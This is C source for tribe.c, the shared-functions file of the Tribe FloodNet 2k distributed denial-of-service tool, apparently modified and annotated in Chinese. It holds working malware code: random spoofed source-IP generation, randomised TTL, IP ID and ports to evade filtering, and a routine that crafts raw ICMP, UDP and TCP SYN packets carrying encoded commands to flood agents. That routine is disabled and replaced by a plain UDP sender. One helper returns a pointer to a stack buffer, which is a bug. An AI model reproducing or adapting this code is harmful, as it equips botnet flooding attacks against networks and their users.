/* 
* Tribe FloodNet - 2k edition 
* by Mixter <mixter@newyorkoffice.com> 
* 
* tribe.c - common functions 
* 
* This program is distributed for educational purposes and without any 
* explicit or implicit warranty; in no event shall the author or 
* contributors be liable for any direct, indirect or incidental damages 
* arising in any way out of the use of this software. 
* 
*/ 

#include "tribe.h" 

int rcounter = 0; 
char rseed[1*1024*1024]; 
extern unsigned int myip; 
extern int nospoof; 

void  
random_init (void) 
{ 
   int rfd = open ("/dev/urandom", O_RDONLY); 
   if (rfd < 0) 
     rfd = open ("/dev/random", O_RDONLY); 
   rcounter = read (rfd, rseed, 1*1024*1024); 
   close (rfd); 
} 

inline 
int  
getrandom (int min, int max) 
{ 
   if (rcounter < 2) 
     random_init (); 
   srand (rseed[rcounter] + (rseed[rcounter - 1] << 8)); 
   rcounter -= 2; 
   return ((random () % (int) (((max) + 1) - (min))) + (min)); 
} 

inline unsigned char get_char_ran(void) 
{ 
       if (rcounter < 2) 
           random_init (); 
       rcounter--; 
       return (rseed[rcounter]); 
} 

unsigned char get_ttl(void) 
{ 
     static unsigned char ttl[4]={255,128,64,32}; 
     static unsigned int i=0; 
     return(ttl[(i++)&3]-(get_char_ran()&0x0f)); 
} 
unsigned  int get_dport(void) 
{ 
      unsigned  int k, dport[8]={21,22,25,80,135,443,8000,22345}; 
      k=getrandom(0,7);
     return(dport[k]); 
} 

unsigned short get_ipid(void) 
{ 
     u16 *pShort; 
     if(rcounter<2) 
         random_init(); 
     rcounter-=2; 
     pShort=(u16*)&rseed[rcounter]; 
     return (*pShort); 
} 

unsigned short get_sport(void) 
{ 
     u16 sport=get_ipid(); 
     return htons((sport&0xFFF)|0x400); 
} 

void 
trimbuf (char *buf) 
{ 
   int i = 0; 
   for (i = 0; i < strlen (buf); i++) 
     if ((buf[i] == '\n') || (buf[i] == '\r')) 
       buf[i] = '\0'; 
} 

inline unsigned int 
k00lip (void) 
{ 
//   struct in_addr hax0r; 
   unsigned int ip;
   u32 *pLong; 
//   char convi[16]; 
//   int a, b, c, d; 
/* 
   if (nospoof < 1) 
     return (unsigned int) (getrandom (0, 65535) + (getrandom (0, 65535) << 

8)); 
     */ 
/* 
   hax0r.s_addr = htonl (myip); 

   sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d); 
   if (nospoof < 2) 
     b = getrandom (1, 254); 
   if (nospoof < 3) 
     c = getrandom (1, 254); 
   d = getrandom (1, 254); 
*/ 
if (rcounter < 2) 
     random_init (); 
//   srand (rseed[rcounter] + (rseed[rcounter - 1] << 8)); 
   rcounter -= 4;   
   pLong=(u32*)&rseed[rcounter]; 
   ip=*pLong; 
//   ip=rand(); 
//   ip|=(rand()<<16); 
   if((ip>>29)==7) 
       ip&=0xdfffffff; 
   else if((ip>>24)==0x7f) 
       ip>>=1; 
   return (ntohl(ip)); 
//   sprintf (convi, "%d.%d.%d.%d", a, b, c, d); 

//   return inet_addr (convi); 
} 

unsigned int sum2(u16 *buff,int len) 
{ 
     unsigned int cksum; 
     for (cksum = 0; len > 0; len-=2) 
             cksum += *buff++; 
     return cksum; 
} 

void  
tfntransmit (unsigned int from, unsigned int to, int proto, char id, char 

*target) 
{ 
#if 0
   unsigned char buf[BS], data[BS]; 
   struct ip *ih = (struct ip *) buf; //ip头
   struct icmp *ich = (struct icmp *) (buf + sizeof (struct ip));//指向ih结构体末尾 icmp头
   struct udp *udh = (struct udp *) (buf + sizeof (struct ip)); 
   struct tcp *tch = (struct tcp *) (buf + sizeof (struct ip)); 
   /* struct phdr *ptcph; */
   struct sa sin; 
   unsigned char *p; //数据内容
   int tot_len = sizeof (struct ip), ssock ;
   int ipsum=0;

   memset (data, 0, BS); 
   data[0] = PROTO_SEP; 
   data[1] = id; 
   data[2] = PROTO_SEP; 
   strncpy ((char *)(data + 3), target, BS - 3);  //target port

   sin.fam = AF_INET; 
   sin.add = to; 
   memset (buf, 0, BS); 

   ih->ver = 4; 
   ih->ihl = 5; 
   ih->tos = 0x00; 
   ih->tl = 0; 
   ih->id = htons (getrandom (1024, 65535));//随机端口号？
   ih->off = 0; 
   ih->ttl = getrandom (64, 128); 
   ih->sum = 0; 
   ih->src = resolve(getlocalIp());
   ih->dst = to; 
   

   switch ((proto == -1) ? getrandom (0, 2) : proto) 
     { 
     case 0: 
       tot_len += sizeof (struct icmp); 
       ih->pro = ICMP; 
       ssock = socket (AF_INET, SOCK_RAW, ICMP); 
       p = buf + sizeof (struct ip) + sizeof (struct icmp); 
       ich->type = getrandom(0, 1) ? 8 : 0; 
       ich->code = 0; 
       ich->id = getrandom (0, 1) ? getrandom (0, 65535) : 0; 
       ich->seq = getrandom (0, 1) ? getrandom (0, 65535) : 0; 
       ich->sum = 0; 
       encode64 (data, p, strlen((char *)data)); 
       tot_len += strlen ((char *)p); 
       ich->sum = cksum ((u16 *) ich, tot_len >> 1); 
       ih->tl = tot_len; 
       sin.dp = htons (0);
       break; 
     case 1: 
       tot_len += sizeof (struct udp); 
       ih->pro = UDP; 
       ssock = socket (AF_INET, SOCK_RAW, UDP); 
       p = buf + sizeof (struct ip) + sizeof (struct udp); 
       udh->src = htons (getrandom (0, 65535)); 
       udh->dst = htons (getrandom (0, 65535)); 
/*     udh->len = htons (sizeof (struct udp) + strlen (p));  */
       udh->sum = 0; 
       encode64 (data, p, strlen((char *)data)); 
       tot_len += strlen ((char *)p); 
       udh->len = htons (sizeof (struct udp) + strlen((char *)p)); //udp+数据大小
       udh->sum = cksum ((u16 *) udh, tot_len >> 1); 
       ih->tl = tot_len; 
       sin.dp = htons (udh->dst); 
       break; 
     case 2: 
       tot_len += sizeof (struct tcp); 
       ih->pro = TCP; 
       ssock = socket (AF_INET, SOCK_RAW, TCP); 
       p = buf + sizeof (struct ip) + sizeof (struct tcp); 
       tch->src = htons (getrandom (4096, 65535)); 
       tch->dst = htons(get_dport()); 
       tch->seq = htonl (getrandom (1024, 65535) + (getrandom (1024, 8192) << 8)) ; 
       tch->ack =  0; 
	tch->x2 = 0 ;
       tch->off = 5; 
      /* tch->flg = getrandom (0, 1) ? (getrandom (0, 1) ? SYN : ACK) : SYN | ACK; */
       tch->flg = SYN;
       tch->win = htons(8*getrandom (500, 3000)); 
       tch->urp = 0; 
       tch->sum = 0; 
       encode64 (data, p, strlen( (char *)data) ); 
       tot_len += strlen ((char *)p); 
       /* tch->sum = cksum ((u16 *) tch, tot_len >> 1); */
       ih->tl = htons(tot_len); 
   struct phdr *ptcph=(struct phdr*)(buf+sizeof(struct ip )+sizeof(struct tcp)+strlen((char *)p));
   ptcph->sip=ih->src; 
   ptcph->dip=ih->dst; 
   ptcph->proto=6; 
   ptcph->zero=0; 
   ptcph->len=htons(tot_len-20); //total-ip头大小

      //printf("IP header checksum:");
        ih->sum=ip_sum((u16 *)ih,20);

       //printf("\n\ntcpheader and WEI_TCPHEADER,total_len is %d :",tot_len-8);
       ipsum = ip_sum2((u16*)tch,tot_len-20)+ip_sum2((u16*)ptcph,12);  
       ipsum=(ipsum >>16)+(ipsum & 0xffff);
       ipsum+=ipsum >>16;
     /* printf("\n\nTCP header: tcplen is %d,add WEI_TCPHEADER_len is %d:",tot_len-20,tot_len-8); */

         /* tch->sum=ip_sum((u16 *)tch,tot_len-8);      */
	tch->sum=htons((~ipsum)&0xffff);
         
         //printf("true cheksum is %x\n\n\n",(~ipsum)&0xffff);

     
      /*  tch->sum=~ipsum; */
  
     sin.dp = htons (tch->dst); 
       break; 
     default: 
       exit (0); 
       break; 
     } 

   setsockopt (ssock, IP, IP_HDRINCL, "1", sizeof ("1")); 
   if (sendto (ssock, buf, tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) 

< 0) 
     perror ("sendto"); 

   close (ssock);
#endif
//=========================================================
	char data[20]; 
   	int usock = socket(AF_INET,SOCK_DGRAM,0);
   	struct sockaddr_in ser_addr;
	memset(&ser_addr,0,sizeof(struct sockaddr_in));
	ser_addr.sin_family = AF_INET;
	ser_addr.sin_port   = htons(9997);
	ser_addr.sin_addr.s_addr = inet_addr(ntoa(to));
	memset (data, 0, sizeof(data)); 
#if 1
   	data[0] = PROTO_SEP; 
   	data[1] = id; 
   	data[2] = PROTO_SEP; 
	strncpy ((char *)(data + 3), target, sizeof(data) - 3); 
#endif
	sendto(usock,data,sizeof(data),0,
			(struct sockaddr *)&ser_addr,sizeof(ser_addr));
	close(usock);
//=====================================================================
} 

#ifdef ATTACKLOG 
void 
dbug (char *s) 
{ 
   int f = open (ATTACKLOG, O_WRONLY | O_APPEND | O_CREAT , 0777); 
   write (f, s, strlen (s)); 
   close (f); 
} 
#endif 

char *getlocalIp()
{
	char addressBuffer[INET_ADDRSTRLEN];
	struct ifaddrs *ifAddrStruct = NULL;
	void * tmpAddrPtr=NULL;
	getifaddrs(&ifAddrStruct);
	while(ifAddrStruct != NULL){
		if(ifAddrStruct->ifa_addr->sa_family==AF_INET && 
			strcmp(ifAddrStruct->ifa_name,"eth0")==0){
			tmpAddrPtr = &((struct sockaddr_in *)ifAddrStruct->ifa_addr)->sin_addr;  
            		inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN); 
			break;
		}
		ifAddrStruct = ifAddrStruct->ifa_next;			
	}
	return addressBuffer;
}
